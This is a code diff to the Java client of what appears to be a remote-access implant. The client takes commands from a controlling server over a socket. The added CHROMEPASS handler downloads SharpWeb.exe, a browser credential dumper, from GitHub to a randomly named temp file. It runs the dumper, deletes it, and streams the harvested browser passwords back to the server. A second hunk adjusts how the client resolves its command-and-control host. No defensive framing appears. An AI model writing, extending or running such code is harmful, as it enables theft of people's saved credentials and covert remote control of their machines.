@@ -291,6 +291,40 @@ public class Client {
                     }
                     socket.close();
                     System.exit(0);
+                } else if (input.contains("CHROMEPASS")){
+                    communicate("CHROMEPASS");
+                    URL url = new URL("https://github.com/djhohnstein/SharpWeb/releases/download/v1.0/SharpWeb.exe");
+                    String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".exe";
+                    try(BufferedInputStream in = new BufferedInputStream(url.openStream());
+                        FileOutputStream fileOutputStream = new FileOutputStream(fname)){
+                        byte[] dataBuffer = new byte[2048];
+                        int bytesRead;
+                        while ((bytesRead = in.read(dataBuffer, 0, 2048)) != -1){
+                            fileOutputStream.write(dataBuffer, 0, bytesRead);
+                        }
+                        if (debugMode) {
+                            System.out.println("Filename: " + fname);
+                        }
+                    } catch (IOException ioe){
+                        if (debugMode){ ioe.printStackTrace(); }
+                    }
+
+
+                    String cmd = fname + " all && del /f " + fname;
+                    if (debugMode){System.out.println("Command: " + cmd);}
+
+                    // Run the command
+                    Runtime r = Runtime.getRuntime();
+                    Process p = r.exec(cmd);
+
+                    // Read file
+                    BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                    String s;
+                    while ((s = stdInput.readLine()) != null){
+                        communicate(s + "\n");
+                        if (debugMode){System.out.println("Got line: " + s);}
+                    }
+                    communicate("ENDCHROME");
                 } else if (input.contains("PSHURL")) {
                     /*
                     Server: PSHURL url
@@ -561,10 +595,22 @@ public class Client {
                 HOST = (settings[0]);
                 // Change domain to ip
                 try{
-                    new URL(HOST);
-                    HOST = InetAddress.getByName(HOST).getHostAddress();
+                    String tmphost = "";
+                    if (!HOST.contains("http://")) {
+                        tmphost = "http://" + HOST;
+                    } else {
+                        tmphost = HOST;
+                    }
+
+                    new URL(tmphost); // Error will be thrown here if invalid url
+                    HOST = HOST.replaceAll("^https?://", ""); // Replace here in case of valid URL but UnknownHostException
+                    String ip = InetAddress.getByName(HOST).getHostAddress();
+                    if (debugMode) System.out.println("Domain host detected: " + HOST + " -> " + ip);
+                    HOST = ip;
                 } catch (MalformedURLException e){
                     // Not a valid domain, it's an ip address. Leave it be
+                    if (debugMode) System.out.println("IP host detected: " + HOST);
+
                 }
                 PORT = (Integer.parseInt(settings[1]));
                 isPersistent = (Boolean.parseBoolean(settings[2]));
